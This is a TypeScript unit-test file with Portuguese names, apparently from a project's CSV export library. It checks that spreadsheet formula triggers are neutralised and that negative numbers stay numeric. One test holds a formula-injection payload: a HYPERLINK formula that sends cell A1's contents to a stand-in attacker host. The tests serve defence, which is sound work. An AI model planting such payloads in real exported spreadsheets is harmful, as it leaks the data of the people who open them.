import assert from 'node:assert/strict'
import { describe, test } from 'node:test'
import { csvNumber, parseCsv, toCsv } from '../src/lib/csv.js'

function celulas(csv: string) {
  return csv.split('\r\n').map((linha) => linha.replace('﻿', ''))
}

describe('exportação de planilha não entrega fórmula para o Excel', () => {
  test('nome começando com = sai como texto', () => {
    const csv = toCsv(['Nome'], [['=HYPERLINK("http://atacante/?x="&A1;"clique")']])
    assert.equal(celulas(csv)[1], `"'=HYPERLINK(""http://atacante/?x=""&A1;""clique"")"`)
  })

  test('os quatro gatilhos de fórmula são neutralizados', () => {
    for (const gatilho of ['=', '+', '@']) {
      const csv = toCsv(['Nome'], [[`${gatilho}cmd`]])
      assert.equal(celulas(csv)[1], `'${gatilho}cmd`, `gatilho ${gatilho}`)
    }
    // O `-` só é neutralizado quando não é número (ver teste seguinte).
    assert.equal(celulas(toCsv(['Nome'], [['-2+3+cmd']]))[1], "'-2+3+cmd")
  })

  test('tabulação e retorno de carro no início também', () => {
    assert.equal(celulas(toCsv(['Nome'], [['\t=1+1']]))[1], "'\t=1+1")
  })

  // A vírgula decimal faz a célula sair entre aspas — comportamento anterior a esta proteção.
  // O que se verifica aqui é a ausência do apóstrofo: com ele, a planilha pararia de somar a coluna.
  test('quantidade negativa continua número, não vira texto', () => {
    for (const numero of ['-2', '-2,000', '-1.234,56', '0', '47', '3,50']) {
      const celula = celulas(toCsv(['Q'], [[numero]]))[1]
      assert.equal(celula.includes("'"), false, `número ${numero} não deve receber apóstrofo`)
      assert.deepEqual(parseCsv(toCsv(['Q'], [[numero]])), [['Q'], [numero]], `ida e volta de ${numero}`)
    }
  })

  test('csvNumber negativo sai sem apóstrofo', () => {
    assert.equal(celulas(toCsv(['Q'], [[csvNumber(-3, 3)]]))[1], '"-3,000"')
  })

  test('texto comum e vazio seguem intactos', () => {
    assert.equal(celulas(toCsv(['Nome'], [['Alface Crespa']]))[1], 'Alface Crespa')
    assert.equal(celulas(toCsv(['Nome'], [[null]]))[1], '')
  })
})

describe('planilha exportada volta pela importação sem o apóstrofo', () => {
  test('ida e volta preserva o valor original', () => {
    const original = [['Nome', 'Estoque'], ['=SOMA(A1)', '-2,000'], ['-teste', '10']]
    const lido = parseCsv(toCsv(original[0], original.slice(1)))
    assert.deepEqual(lido, original)
  })

  test('apóstrofo que não protege fórmula é preservado', () => {
    // `'Maria` é um nome, não uma célula protegida: o caractere seguinte não é gatilho.
    assert.deepEqual(parseCsv("Nome\r\n'Maria"), [['Nome'], ["'Maria"]])
  })
})
